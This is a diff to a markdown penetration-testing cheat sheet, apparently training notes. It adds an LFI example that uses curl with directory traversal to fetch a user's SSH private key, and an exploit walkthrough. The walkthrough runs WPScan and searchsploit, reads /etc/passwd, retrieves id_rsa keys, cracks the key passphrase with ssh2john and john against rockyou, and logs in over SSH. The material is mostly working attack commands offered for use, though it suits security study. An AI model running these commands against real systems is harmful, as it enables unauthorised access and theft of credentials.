@@ -59,11 +59,34 @@ hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
 I’ll save that to a file and chmod it to 600 so SSH will use it.
 ```
 
-## Example LFI to keygrab
+## Example LFI to keygrab 1
 ```
 kali@kali:~$ curl http://valleys.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
 kali@kali:~$ chmod 400 dt_key
 kali@kali:~$ ssh -i dt_key -p 2222 user@valleys.com
+```
+
+## Example Exploit Flow
+```
+Let's say maybe you find a wordpress site and scan for plugins with WPScan.
+You find some vulnerable plugins and research them for exploits with searchsploit.
+You find one that is applicable and it turns out to be a Directory Traversal vulnerability.
+You Utilize the exploit to read /etc/passwd and identify two users, add them to your users.txt.
+From here there are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system.
+One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.
+Next attempt to retrieve an SSH private key with the name id_rsa.
+The name will differ depending on the specified type when creating an SSH private key with ssh-keygen. When choosing ecdsa as the type, the resulting SSH private key is named id_ecdsa by default.
+/home/wint3rmute/.ssh/id_rsa  <-- Username enumeration is creticial before successful key LFI. Read /etc/passwd first. Then try your key types. 
+/home/PeterRiviera/.ssh/id_rsa <-- Success finding an id_rsa key for user PeterRiviera.
+Attempt to leverage this key to access WEBSRV1 as PeterRiviera via SSH. 
+Change the Permissions: chmod 600 id_rsa
+Try logging in: ssh -i id_rsa PeterRiviera@192.168.50.244
+Enter passphrase for key 'id_rsa': 
+The SSH private key is protected by a passphrase. 
+Convert the key with ssh2john id_rsa > ssh.hash
+Crack the passphrase of the SSH private key:  $ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+VillaStraylight    (id_rsa)
+Login with the cracked passphrase and gain access to the server. 
 ```
 
 ## Fuzzing
